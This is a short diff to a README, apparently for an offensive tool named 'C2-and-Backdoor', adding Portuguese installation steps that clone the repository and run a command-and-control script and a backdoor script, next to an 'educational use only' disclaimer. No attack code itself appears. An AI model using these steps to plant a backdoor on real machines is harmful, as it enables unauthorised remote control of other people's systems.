@@ -21,4 +21,14 @@ Instructions:
                 To see your IP, just type "ifconfig" or "ipconfig".
                  USE THIS FOR EDUCATIONAL USE ONLY.
 
+
+
+Instalação:
+          git clone https://github.com/aliczx/C2-and-Backdoor.git
+          cd C2-and-Backdoor.git
+          python c2.py 
+          python backdoor.py
+
+Archlinux::
+
                  
